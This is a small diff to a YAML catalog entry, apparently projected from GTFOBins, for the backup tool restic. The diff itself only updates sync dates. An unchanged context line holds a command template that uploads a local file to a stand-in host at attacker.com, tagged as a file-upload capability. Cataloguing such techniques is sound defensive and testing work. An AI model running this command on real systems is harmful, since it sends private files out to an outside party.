@@ -13,7 +13,7 @@ sources:
   upstream_url: https://gtfobins.github.io
   license: GPL-3.0
   upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
-  last_synced: '2026-11-13'
+  last_synced: '2026-11-14'
 commands:
 - template: restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
 references:
@@ -86,7 +86,7 @@ source_data:
                   ```'
     upstream_url: https://gtfobins.github.io/gtfobins/restic/
     upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
-    last_synced: '2026-11-13'
+    last_synced: '2026-11-14'
 enrichment:
   capabilities:
   - value: file-upload
@@ -122,6 +122,6 @@ enrichment:
 _meta:
   schema_version: 1
   generated_by: loldex-projection
-  projected_at: '2026-11-13'
+  projected_at: '2026-11-14'
   source_hashes:
     GTFOBins: sha256:f8d5c1d0bfa95f614e54d23040b13aa0b543f73bb668067d2b580eef61d94db4
